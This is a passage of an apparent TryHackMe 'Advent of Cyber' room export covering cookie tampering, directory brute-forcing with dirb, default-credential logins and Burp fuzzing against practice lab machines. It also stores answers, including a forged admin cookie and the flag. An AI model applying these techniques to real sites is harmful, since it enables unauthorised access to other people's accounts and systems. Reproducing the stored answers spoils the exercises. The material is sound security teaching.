26);background:transparent;margin-top:0pt;margin-bottom:0pt\"> method, such as sending login information.</span><br /></p><p><span style=\"font-size:16px\"><b>Example Request</b></span></p><pre class=\" language-http\" style=\"font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;font-size:16px;margin-top:0.5em;margin-bottom:0.5em;color:black;background:rgb(245, 242, 240);word-break:normal;overflow-wrap:normal;line-height:1.5;tab-size:4;hyphens:none;padding:1em\"><code class=\" language-http\" style=\"font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;font-size:1em;color:black;background:none;padding-top:6px;white-space:pre;word-spacing:normal;overflow-wrap:normal;line-height:1.5;tab-size:4;hyphens:none\"><span class=\"token request-line\"><span class=\"token method property\" style=\"color:rgb(153, 0, 85)\">GET</span> <span class=\"token request-target url\" style=\"color:rgb(154, 110, 58);background:rgba(255, 255, 255, 0.5)\">/</span> <span class=\"token http-version property\" style=\"color:rgb(153, 0, 85)\">HTTP/1.1</span></span>\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">Host:</span> tryhackme.com\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">User-Agent:</span> Mozilla/5.0 Firefox/87.0\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">Referer:</span> https://tryhackme.com/</code></pre><p>Once the server receives a request, it will send back a response, including any requested content if successful and a status code. The status code is used to tell the client browser how the webserver interpreted the request. The most common \"successful\" status code is <code>HTTP 200 OK</code>.<br /></p><p><b>Example Response</b></p><pre class=\" language-http\" style=\"font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;font-size:16px;margin-top:0.5em;margin-bottom:0.5em;background:rgb(245, 242, 240);word-break:normal;overflow-wrap:normal;line-height:1.5;tab-size:4;hyphens:none;padding:1em\"><code class=\" language-http\" style=\"font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;font-size:1em;background:none;padding-top:6px;white-space:pre;word-spacing:normal;overflow-wrap:normal;line-height:1.5;tab-size:4;hyphens:none\"><span class=\"token response-status\" style=\"color:black\"><span class=\"token http-version property\" style=\"color:rgb(153, 0, 85)\">HTTP/1.1</span> <span class=\"token status-code number\" style=\"color:rgb(153, 0, 85)\">200</span> <span class=\"token reason-phrase string\" style=\"color:rgb(102, 153, 0)\">OK</span></span>\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">Server:</span> nginx/1.15.8\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">Date:</span> Wednesday, 24 Nov 2021 13:34:03 GMT\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">Content-Type:</span> text/html\n<span class=\"token header-name keyword\" style=\"color:rgb(0, 119, 170)\">Content-Length:</span> 98<span class=\"token text-html\">\n\n<span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;</span>html</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span>\n<span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;</span>head</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;</span>title</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span><span class=\"token punctuation\">Advent of Cyber</span></span><span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;/</span>title</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span>\n<span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;/</span>head</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span>\n<span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;</span>body</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span>\n    Welcome To Advent of Cyber!\n<span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;/</span>body</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span>\n<span class=\"token tag\" style=\"color:rgb(153, 0, 85)\"><span class=\"token tag\"><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&lt;/</span>html</span><span class=\"token punctuation\" style=\"color:rgb(153, 153, 153)\">&gt;</span></span></span></code></pre><p>The protocol itself is only one small piece of the puzzle; once content is retrieved from the web server, your browser needs a way to interpret and render the information sent. Web applications are commonly formatted in HTML (HyperText Markup Language), rendered, and styled in CSS (Cascading Style Sheets). JavaScript is also commonly used to provide additional functionality.<br /></p><p>In today's web environment, the use of web frameworks has significantly increased in popularity. Most modern web applications use many web frameworks and other web solutions that an end-user does not see or interact with.<br /></p><p>\n\n\n\n\n\n\n</p><p>For more information about HTTP requests, methods, and headers, check out the <a href=\"https://tryhackme.com/room/webfundamentals\">Web Fundamentals</a> room!</p><p><span style=\"font-size:24px\">Cookies</span></p>\n<div>\n<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/44d05b3199fe4c73c810d0f06da27687.png\" style=\"float:right;width:141.24px;height:141.24px\" class=\"note-float-right\" />\n<p>HTTP is a stateless protocol. When you send requests to a web server, the server cannot distinguish your request from someone else's request.. To solve the stateless problem and identify different users and access levels, the webserver will assign cookies to create and manage a stateful session between client and server.</p>\n<p>Cookies are tiny pieces of data (metadata) or information locally stored on your computer that are sent to the server when you make a request.</p>\n<p>Cookies can be assigned any name and any value allowing the webserver to store any information it wants. Today we will be focusing on authentication cookies, also known as session cookies. Authentication or session cookies are used to identify you and what access level is attached to your session.</p>\n</div>\n\n<p>Below is a diagram describing assigning and using a cookie from the initial request to the session request.<br /></p>\n<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/64c8a1a54a0e08d9e89701307462f24b.png\" style=\"width:586.328px;height:454.587px\" /><br /></p>\n\n\n<p>To begin the process, when you send a request such as a login request, your browser will send that information typically as a POST request to the webserver. The web server will verify that it received the data and set a unique cookie; as previously mentioned, cookies are arbitrary, and values are determined by best-practice or the web developer. Once the cookie is assigned, as long as the cookie stays locally stored in your browser, all future GET requests will be automatically sent with that cookie to identify you and your access level. Once the server receives your GET request and cookie, it will locate and de-serialize your session. Deserialization is the process of taking a data format such as JSON and rebuilding it as an object. If successful, the webserver will reply to your request with a 200 response.</p><p>Now that we understand what cookies are and how they are used, let us dive into their contents.<br /></p><p>\n</p>\n\n<p><span style=\"font-size:24px\">Cookie Components</span></p>\n\n<p>Cookies are made up of 11 different components; you can find an explanation of each component in the table below.<br /></p><table class=\"table table-bordered\"><tbody>\n\n\n<tr><td><b>Component</b></td><td><b>Purpose</b></td><td><b>Example</b></td></tr><tr><td>Name</td><td>Unique cookie identifier (arbitrarily set by web-server). Always paired with the value component.</td><td>SessionID</td></tr><tr><td>Value</td><td>Unique cookie value (arbitrarily set by web-server). Always paired with the name component<br /></td><td>sty1z3kz11mpqxjv648mqwlx4ginpt6c<br /></td></tr><tr><td>Domain</td><td>Originating domain of the cookie. Sets the scope of the cookie.<br /></td><td>.tryhackme.com<br /></td></tr><tr><td>Path</td><td>Local path to cookie. Sets the scope of the cookie.<br /></td><td>/<br /></td></tr><tr><td>Expires/Max-age</td><td>Date/time at which cookies expires<br /></td><td>2022-11-11T15:39:04.166Z<br /></td></tr><tr><td>Size</td><td>Disk size of the cookie in bytes. This is typically {Name+Value}<br /></td><td>91<br /></td></tr><tr><td>HttpOnly</td><td>Cookie cannot be accessed through client-side scripts<br /></td><td>(indicated by a checkmark)<br /></td></tr><tr><td>Secure</td><td>Cookie is only sent over HTTPS<br /></td><td>(indicated by a checkmark)<br /></td></tr><tr><td>SameSite</td><td>Specifies when a cookie is sent through cross-site requests<br /></td><td>none<br /></td></tr><tr><td>SameParty</td><td>Extends functionality of <i>SameSite</i> attribute to First-Party sets. <br /></td><td>(indicated by a checkmark)<br /></td></tr><tr><td>Priority</td><td>Defines the importance of a cookie. Determines whether it should be removed or held on to<br /></td><td>High<br /></td></tr>\n</tbody></table>\n\n<p>Looking at all the components of a cookie may seem intimidating. There is no need to worry as attackers; we only need to concern ourselves with two components: <code>Name</code> and <code>Value</code>; the rest of the components are handled by the webserver.<br /></p><p>Cookie components are always prepared in pairs. The main pair is <code>name-value</code>; this will define the name of the cookie and the value of the name. The second pair is the <code>attribute-value</code> pair; this will define an attribute of the cookie and the value of the attribute. Below is an example of what <code>Set-Cookie</code> syntax looks like.<br /></p><p style=\"text-align:center\"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</code><br /></p><p><span style=\"font-size:24px\">Cookie Manipulation</span></p>\n\n\n<div>\n<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/898063d13e178ef01f6442c84270e40e.png\" style=\"float:left;width:141.24px;height:141.24px\" class=\"note-float-left\" />\n<p>Cookie manipulation is taking a cookie and modifying it to obtain unintended behavior determined by the web developer. Cookie manipulation is possible because cookies are stored locally on your host system, meaning you have complete control over them and modify them as you please.<br /></p><p><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">To begin modifying and manipulating cookies, we need to open our developer tools. In Google Chrome, developer tools are known as the </span><em>\"Chrome Developer Tools,\"</em><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\"> and in Mozilla Firefox, they are known as the </span><em>\"Firefox Developer Tools.\"</em></p><p>Developer tools can be accessed by pressing <code>F12</code> or <code>Ctrl+Shift+I</code>. Once developer tools are open, to access your cookies, navigate to the <code>Storage</code> tab in Firefox or <code>Application</code> tab in Chrome/Edge; select the <code>Cookies</code> dropdown on the left-hand side of the console.<br /></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fe6e979cce8c9e8396ce40c24a2140b9.png\" style=\"width:954px\" /><br /></p>\n</div>\n\n<p>Cookie values may seem random at first; however, they often have an encoded value or meaning behind them that can be decoded to a non-arbitrary value such as a Javascript object.</p><p>From an attacker's perspective, you can decode the cookie value to identify the underlying objects. Once you have identified the underlying objects, you can modify them to what you want. To use the cookie, you will need to encode it back to the original encoding and replace the cookie value. Below is an example of a decoded cookie value.</p><p style=\"text-align:center\"><code>{firstName:\"John\", lastName:\"Doe\", age:50, eyeColor:\"blue\"</code></p><p>\n\n\n\n\n\n\n</p><p>Now that we have all of the pieces of cookies and how to manipulate them, we can put them all together to gain unintended access.</p><p>Below is a summary of how cookie values could be manipulated.</p><ol><li>Obtain a cookie value from registering or signing up for an account.</li><li>Decode the cookie value.</li><li>Identify the object notation or structure of the cookie.</li><li>Change the parameters inside the object to a different parameter with a higher privilege level, such as admin or administrator.</li><li style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:decimal\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Re-encode the cookie and insert the cookie into the value space; this can be done by double-clicking the value box.</span></li><li style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:decimal\"><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Action the cookie; this can be done by refreshing the page or logging in.</span></li></ol><p><span style=\"font-size:24px\">Additional Resources</span></p><p><span style=\"font-size:16px\">﻿</span><span style=\"background-color:transparent;color:rgb(14, 16, 26);font-size:1rem\">For more information about HTTP(s) and cookies, check out these other TryHackMe rooms.</span></p><ul>\n<li>HTTP: <a href=\"https://tryhackme.com/jr/httpindetail\"></a><a href=\"https://tryhackme.com/jr/httpindetail\">https://tryhackme.com/jr/httpindetail</a></li>\n<li>Authentication: <a href=\"https://tryhackme.com/jr/authenticationbypass\" target=\"_blank\">https://tryhackme.com/jr/authenticationbypass</a><a href=\"https://tryhackme.com/jr/authenticationbypass\"></a></li></ul><p style=\"text-align:center\"><span style=\"font-size:24px\">If you're stuck solving the challenge, check out the walkthrough video </span><a href=\"https://www.youtube.com/watch?v=bovOGgp_TbE&amp;t\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></p>","taskType":"none","taskNo":7,"taskCreated":"2021-11-16T13:41:10.040Z","taskDeadline":null,"tasksInfo":[{"question":"Open the static site in a new tab, <a href=\"https://static-labs.tryhackme.cloud/sites/aoc-cookies/\" target=\"_blank\">here</a>.","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Register an account, and verify the cookies using the Developer Tools in your browser.</p><p>What is the name of the new cookie that was created for your account?</p>","hint":"Even if you cannot register an account data may still be submitted on the backend. Check your cookies.","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"user-auth","noAnswer":false,"answerDesc":"Answer format: *********"},{"question":"<p>What encoding type was used for the cookie value?<br /></p>","hint":"Use Cyberchef to decode the value","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"hexadecimal","noAnswer":false,"answerDesc":"Answer format: ***********"},{"question":"<p>What object format is the data of the cookie stored in?<br /></p>","hint":"A type of object notation","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"JSON","noAnswer":false,"answerDesc":"Answer format: ****"},{"question":"<p>Manipulate the cookie and bypass the login portal.</p><p>What is the value of the administrator cookie? (username = admin)</p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":0,"submission":"7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d","noAnswer":false,"answerDesc":"Answer format: **********************************************************************************************************************************************************"},{"question":"<p>What team environment is not responding?<br /></p>","hint":"Indicated by a red status symbol","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"HR","noAnswer":false,"answerDesc":"Answer format: **"},{"question":"<p>What team environment has a network warning?<br /></p>","hint":"Indicated by a yellow status symbol","questionNo":7,"correct":true,"extraPoints":0,"attempts":0,"submission":"Application","noAnswer":false,"answerDesc":"Answer format: ***********"},{"question":"<p>If you want to learn more about Authentication bypasses, we suggest trying out this room <a href=\"https://tryhackme.com/jr/authenticationbypass\" target=\"_blank\">https://tryhackme.com/jr/authenticationbypass</a>  <br /></p>","hint":"","questionNo":8,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Tasks released each day get progressively harder (but are still guided with walkthrough videos). Come back tomorrow for Day 3's task, where InsiderPHD will be recording a video walkthrough!</p>","hint":"","questionNo":9,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"}],"uploadId":"","questions":[{"questionNo":1,"question":"Open the static site in a new tab, <a href=\"https://static-labs.tryhackme.cloud/sites/aoc-cookies/\" target=\"_blank\">here</a>.","hint":""},{"questionNo":2,"question":"<p>Register an account, and verify the cookies using the Developer Tools in your browser.</p><p>What is the name of the new cookie that was created for your account?</p>","hint":"Even if you cannot register an account data may still be submitted on the backend. Check your cookies."},{"questionNo":3,"question":"<p>What encoding type was used for the cookie value?<br /></p>","hint":"Use Cyberchef to decode the value"},{"questionNo":4,"question":"<p>What object format is the data of the cookie stored in?<br /></p>","hint":"A type of object notation"},{"questionNo":5,"question":"<p>Manipulate the cookie and bypass the login portal.</p><p>What is the value of the administrator cookie? (username = admin)</p>","hint":""},{"questionNo":6,"question":"<p>What team environment is not responding?<br /></p>","hint":"Indicated by a red status symbol"},{"questionNo":7,"question":"<p>What team environment has a network warning?<br /></p>","hint":"Indicated by a yellow status symbol"},{"questionNo":8,"question":"<p>If you want to learn more about Authentication bypasses, we suggest trying out this room <a href=\"https://tryhackme.com/jr/authenticationbypass\" target=\"_blank\">https://tryhackme.com/jr/authenticationbypass</a>  <br /></p>","hint":""},{"questionNo":9,"question":"<p>Tasks released each day get progressively harder (but are still guided with walkthrough videos). Come back tomorrow for Day 3's task, where InsiderPHD will be recording a video walkthrough!</p>","hint":""}]},{"taskTitle":"[Day 3] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Christmas Blackout","taskDesc":"<p style=\"text-align:center\"><i>Grinch Enterprises have also tried to block communication between anyone at the company. They've locked everyone out of their email systems and McSysAdmin has also lost access to their admin panel. Can you find the admin panel and help restore communication for the Best Festival Company.</i></p><hr /><h2><span style=\"text-align:center;font-size:24px\">Check out InsiderPHD's walkthrough video for day 3 </span><a href=\"https://www.youtube.com/watch?v=8dUylKcDUvU\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><h2>Learning Objectives</h2><p>\n</p><p>In today's task, we're going to be using our investigatory skills and techniques to discover un-listed content, and attempt some common authentication using the clues around us.</p><p><br /></p><h2>What is Content Discovery &amp; Why is it Useful?</h2><p>Before we begin looking for content, let's define what \"content\" actually is. Content is the assets and inner workings of the application that we are testing. Contents can be files, folders, or pathways that weren't necessarily intended to be accessed by the general public.</p><p>For example, you may have a blog, where you post about your tasty treats! You want everyone to view all of your delicious snacks, but you don't want everyone to be able to manage what delicious snacks are up for review - You may hide the administrator panel away from the public!</p><p><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8489db97f610a4f3a887f18abc77666c.png\" /><br /></p><p>Let's expand on this. Web servers, unless configured otherwise, are designed to serve these files and folders, as long as you know the names.</p><p><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/9103a7993e8f6dd2d745c67256cee482.png\" style=\"width:436.038px;height:176.511px\" /><br /></p><p><span style=\"font-size:1rem\">Content discovery is a useful technique to have in our arsenal because it allows us to find things that we aren't supposed to see. For example, we may be able to find:</span><br /></p><ul>\n<li>Configuration files</li>\n<li>Passwords and secrets</li>\n<li>Backups</li>\n<li>Content management systems</li>\n<li>Administrator dashboards or portals</li>\n</ul><p>\n</p><p>These are just some examples of the types of information that we may be able to uncover by discovering content. We can find these pieces of information because they are stored in either a folder (which will have a name) or a file (which will have both a name and extension). This means that we can search for files by their extension, for example, discovering text files with the extension of <code>.txt</code>.</p><p><span style=\"font-size:1rem\">You can do this manually by thinking of some names such as \"<i>admin</i>\" or \"<i>passwords.txt</i>\" and navigating to it in your browser. However, we can use tools to do this process for us at a considerably faster rate. Enter Dirbuster. Dirbuster is a tool that we can use to automate this process for us. The tool works by accepting a wordlist which is a file containing everything that we want to search for, and then a few other arguments. Let's demonstrate this into the snippets below:</span><br /></p>\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            My Wordlist\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">cmnatic@thm$ cat wordlist.txt\n\nadmin/\ndocs/\nconfig/\ninstall/\ninstall-en/\n</code>\n        </pre></div></div><p>Dirbuster will scan the website \"santascookies.thm\" for the folders listed within this wordlist. To use Dirbuster to discover content on this site, we would use the command <code>dirb</code> and provide some information such as the URL of the website and the location of the word list. Our final command would look like something similar to the snippet below::</p><p><br /></p><div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            An example Dirbuster command\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">cmnatic@thm$ dirb http://santascookies.thm/ /usr/share/wordlists/mywordlist.txt\n</code>\n        </pre>\n    </div>\n</div>\n<p>In the above, we have provided Dirbuster the following commands:</p><ol>\n<li>The URL of the website</li>\n<li>The location (full path) on our attacking machine of our wordlist. If you are unfamiliar with this, check out <a href=\"https://tryhackme.com/module/linux-fundamentals\" target=\"_blank\">Linux Fundamentals</a>.</li>\n</ol><p>\n\n</p><p>Now, once we execute this command, Dirbuster will search for the existence of a directory on the website using every value in the wordlist that we have created. </p>\n\n<div class=\"terminal-container\">\n    <div class=\"terminal-content\">\n        <div class=\"terminal-top\">\n            Listing example wordlists to use with Dirbuster\n        </div>\n        <pre class=\"terminal-code\">           <code class=\"language-shell-session\">cmnatic@thm:/usr/share/wordlists/dirb# ls \n\nbig.txt     euskera.txt            mutations_common.txt  spanish.txt\ncatala.txt  extensions_common.txt  others                stress\ncommon.txt  indexes.txt            small.txt             vulns</code>\n        </pre>\n    </div>\n</div>\n\n<p><br /></p><p>Your ability to discover content is only as good as your wordlist. You will find another collection of open-source wordlist such as <a href=\"https://github.com/danielmiessler/SecLists\" target=\"_blank\">SecLists</a>, where you may be able to use a combination of context and wordlist to discover content.</p><p><br /></p><h2>Default Credentials</h2><p>Web applications and services often come with a default pair of credentials. Developers leave these credentials in place so that you can quickly get started with the platform (with the hopes that you will change them). However, as you'll come to discover, not everyone does, or in fact, applications often include other accounts that are not well documented. SecLists also provide a wordlist for default credentials, which you can find <a href=\"https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials\" target=\"_blank\">here</a>.</p><p>For example, take a guess at using some common usernames and password combinations for privileged users. This could include:</p><table class=\"table table-bordered\"><tbody><tr><td style=\"background:#efefef\"><b>Count</b></td><td style=\"background:#efefef\"><b>Username</b></td><td style=\"background:#efefef\"><b>Password</b></td></tr><tr><td>#1</td><td>administrator</td><td>administrator</td></tr><tr><td>#2<br /></td><td>administrator</td><td>password123</td></tr><tr><td>#3<br /></td><td>administrator</td><td>letmein</td></tr></tbody></table><p>Sometimes, these credentials are stored in the web applications configuration files or public documentation. For example, this application, \"BikeIT\", is an open-source application for registering your Bicycle to a community page. The administrator is enabled by default, with credentials provided in both the documentation and source code.</p><p style=\"text-align:center\">  <img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/ab1982d08faa8760fe05fd076a0ac410.png\" style=\"width:1032.24px;height:251.537px\" /></p><p style=\"text-align:center\">The photo above shows the \"Read Me\" documentation (or instructions) for the web application.</p><p style=\"text-align:center\"><code>$username=\"Administrator\";</code></p><p style=\"text-align:center\"><code>$password=\"letmein123\"; //change this</code></p><p style=\"text-align:center\">The source code contains these default credentials too.</p><hr /><p style=\"text-align:center\"></p><p style=\"text-align:center\">Unless the administrator installing this application changes the credentials, anyone will be able to log in using them if they know to look for these details being published (such as they usually are with open-source projects), or are capable of guessing them.</p><p><br /></p><p style=\"text-align:center\">For today's task, you will need to deploy the <b>vulnerable machine attached to this task</b> by pressing the green \"Start Machine\" button at the <b>top right of this task</b> <b>and</b> the<b> TryHackMe AttackBox</b><span style=\"font-size:1rem\">, which can be deployed by pressing the \"Start AttackBox\" button located at the<b> top-right of the room</b>.</span></p><p style=\"text-align:center\"><br /></p><hr /><h2><br /></h2><h2>Additional Resources</h2><p>If you are interested in learning more  (or wish to apply your knowledge) about content discovery and authentication bypass, check out the following rooms on TryHackMe:</p><ul><li><a href=\"https://tryhackme.com/jr/contentdiscovery\" target=\"_blank\">Content Discovery</a></li><li><a href=\"https://tryhackme.com/jr/authenticationbypass\" target=\"_blank\">Authentication Bypass  </a></li></ul><p></p>","taskType":"vm","taskNo":8,"taskCreated":"2021-11-16T13:41:12.242Z","taskDeadline":null,"tasksInfo":[{"question":"Using a common wordlist for discovering content, enumerate http://MACHINE_IP to find the location of the administrator dashboard. What is the name of the folder?","hint":"I recommend using the \"common.txt\" wordlist located at /usr/share/wordlists/dirb/ on the THM AttackBox.\n\nWhen running your dirbuster command, you can provide the \"-r\" option to tell dirbuster to not be recursive, resulting in a faster search. ","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"admin","noAnswer":false,"answerDesc":"Answer format: *****"},{"question":"<p>In your web browser, try <span style=\"font-size:1rem\">some default credentials on the newly discovered login form for the \"</span><span style=\"font-weight:bolder;font-size:1rem\">administrator</span><span style=\"font-size:1rem\">\" user. What is the password?</span><br /></p>","hint":"You already know the username that you will need to login as. Can you think of a default password for this user?","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"administrator","noAnswer":false,"answerDesc":"Answer format: *************"},{"question":"<p>Access the admin panel. What is the value of the flag?<br /></p>","hint":"Default credentials are credentials that already exist within an application so that it can be setup. We have covered some common default credentials in today's task.","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{ADM1N_AC3SS}","noAnswer":false,"answerDesc":"Answer format: ***{***********}"}],"uploadId":"61aa144004143a0049d296d8","questions":[{"questionNo":1,"question":"Using a common wordlist for discovering content, enumerate http://MACHINE_IP to find the location of the administrator dashboard. What is the name of the folder?","hint":"I recommend using the \"common.txt\" wordlist located at /usr/share/wordlists/dirb/ on the THM AttackBox.\n\nWhen running your dirbuster command, you can provide the \"-r\" option to tell dirbuster to not be recursive, resulting in a faster search. "},{"questionNo":2,"question":"<p>In your web browser, try <span style=\"font-size:1rem\">some default credentials on the newly discovered login form for the \"</span><span style=\"font-weight:bolder;font-size:1rem\">administrator</span><span style=\"font-size:1rem\">\" user. What is the password?</span><br /></p>","hint":"You already know the username that you will need to login as. Can you think of a default password for this user?"},{"questionNo":3,"question":"<p>Access the admin panel. What is the value of the flag?<br /></p>","hint":"Default credentials are credentials that already exist within an application so that it can be setup. We have covered some common default credentials in today's task."}]},{"taskTitle":"[Day 4] <span class=\"badge badge-soft-danger size-16\">Web Exploitation</span> Santa's Running Behind","taskDesc":"<h1><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5c3017260705e8786f7a66b4e92b9856.png\" /><br /></h1><p style=\"text-align:center\"><i><br />McSysAdmin managed to reset everyone's access except Santa's! Santa's expected some urgent travel itinerary for his route over Christmas. Rumour has it that Santa never followed the password security recommendations. Can you use bruteforcing to help him access his accounts?</i></p><div style=\"text-align:center\"><h2><span style=\"text-align:center;font-size:24px\">Check out Nahamsec's walkthrough video for day 4 </span><a href=\"https://www.youtube.com/watch?v=jT8-HE95G5Q\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2></div><h1><hr style=\"border:1px solid var(--main-color)\" /></h1><h1><span style=\"font-size:2.5rem\">Learning Objectives</span><br /></h1><p>In today’s task, we’re going to learn the following.</p><ol><li>Understanding authentication and where it is used</li><li>Understanding what fuzzing is</li><li>Understanding what Burp Suite is and how we can use it for fuzzing a login form to gain access</li><li>Apply this knowledge to retrieve Santa’s travel itinerary<span style=\"font-size:1rem\"> <br /><br /></span></li></ol><h1>What is authentication, and where is it Used?</h1><p class=\"Ubuntu\">Authentication is the process of verifying a user’s identity, establishing that they are who they say they are. Authentication can be proven using a variety of authentication means, including:</p><ol><li>A known set of credentials to the server and user such as a username and password<br /></li><li>Token authentication (these are unique pieces of encrypted text)<br /></li><li>Biometric authentication (fingerprints, retina data, etc.)</li></ol><p><span style=\"font-size:1rem\"><br /></span></p><p class=\"Ubuntu\"><span style=\"font-size:1rem\">Authentication is often used interchangeably with authorisation, but it is very different. Authorisation is a term for the rules defining what an </span><span style=\"font-weight:bolder;font-size:1rem\">authenticated</span><span style=\"font-size:1rem\"> user can and cannot access. For example, a standard, the authenticated user will only be allowed access to some aspects of a website. An authenticated administrator will be able to access the entire thing – their level of authorisation determines this.</span></p><p class=\"Ubuntu\">Authentication is used when there is a necessity to know who is accessing pieces of data or information to create accountability – protecting the <i>Confidentiality</i> element of the CIA triad. If you wish to learn more about this, I recommend checking out the <i>Principles of Security room on TryHackMe</i>. You can find examples of authentication in the real world, for example, a badge or key-card to access restricted places within a building.</p><p class=\"Ubuntu\"> </p><h1>What is Fuzzing?</h1><p class=\"Ubuntu\">Put simply, fuzzing is an automated means of testing an element of a web application until the application gives a vulnerability or valuable information. When we are fuzzing, we provide information as we would typically when interacting with it, just at a much faster rate. This means that we can use extensive lists known as wordlists to test a web application’s response to various information.</p><p class=\"Ubuntu\"></p><p class=\"Ubuntu\">For example, rather than testing a login form for a valid set of credentials one-by-one (which is exceptionally time-consuming), we can use a tool for fuzzing this login form to test hundreds of credentials at a much faster rate and more reliably.</p><p class=\"Ubuntu\"></p><p class=\"Ubuntu\"> </p><h1>Fuzzing with Burp Suite</h1><p>Please note that this task presumes that you are using the TryHackMe AttackBox. The AttackBox has the necessary software, tools and wordlists installed for you to complete today’s task – so it is highly recommended that you use it (to start it, scroll to the top of this page and click the blue \"Start AttackBox\" button, then follow the steps below).</p><p><span style=\"font-size:1rem\">1. Let’s launch FireFox by navigating to “<span style=\"font-weight:bolder\">Applications </span>-&gt; <span style=\"font-weight:bolder\">Internet</span>-&gt; <span style=\"font-weight:bolder\">Firefox</span>”</span></p><p style=\"text-align:center\"><img src=\"https://assets.tryhackme.com/additional/aoc2021/day4/firefox1.png\" style=\"width:534px\" /><span style=\"font-size:1rem\"><br /></span></p><p style=\"text-align:center\"><span style=\"font-size:1rem\"><br /></span></p><p><span style=\"font-size:1rem\">2. Navigate to the login form in the web browser using the vulnerable IP address (</span><a href=\"http://machine_ip/\">http://MACHINE_IP</a><span style=\"font-size:1rem\">) (note that the IP address in the screenshots is only an example, you will need to replace this with the MACHINE_IP)</span></p><p style=\"text-align:center\"><img 